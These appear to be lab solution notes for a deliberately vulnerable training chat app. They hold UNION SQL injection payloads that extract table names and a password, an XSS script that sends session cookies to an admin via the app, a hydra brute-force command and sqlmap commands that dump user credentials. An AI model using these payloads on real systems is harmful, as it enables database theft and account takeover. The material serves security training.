# SQL-Injection Advanced

information_schema: table_schema, table_name

' OR 1=1 UNION SELECT table_schema FROM information_schema.tables -- 
-> dvwc

' OR 1=1 UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'dvwc' -- 
-> Chatrooms, PoMessages, Users

' OR 1=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'Users' -- 
-> id, surname, prename, birthday, username, pwd, createdAt, updatedAt

' OR 1=1 UNION SELECT pwd FROM Users WHERE username = 'unionguy' -- 
-> sQL-iNJeCtion4EvERYonE


# XSS Session hijacking

<script>$.ajax({type: "GET", url: "http://dvwc.el.eee.intern/pomessage?message=" + document.cookie + "&from=alice&to=admin", success: (result) => {}});</script>

# Username Enumeration dictionary attack

hydra dvwc.el.eee.intern -V -l urs -P /usr/share/dirb/wordlists/small.txt http-post-form "/login/:username=^USER^&pwd=^PASS^:F=korrekt"

# sql-injection with sql-map

sqlmap -u http://dvwc.el.eee.intern/login --data="pwd=p;form=submit" --method POST --dbs --batch

sqlmap -u http://dvwc.el.eee.intern/login --data="pwd=p;form=submit" --method POST -D dvwc --tables --batch

sqlmap -u http://dvwc.el.eee.intern/login --data="pwd=p;form=submit" --method POST -D dvwc -T Users --columns --batch

sqlmap -u http://dvwc.el.eee.intern/login --data="pwd=p;form=submit" --method POST -D dvwc -T Users -C username,pwd --dump --batch
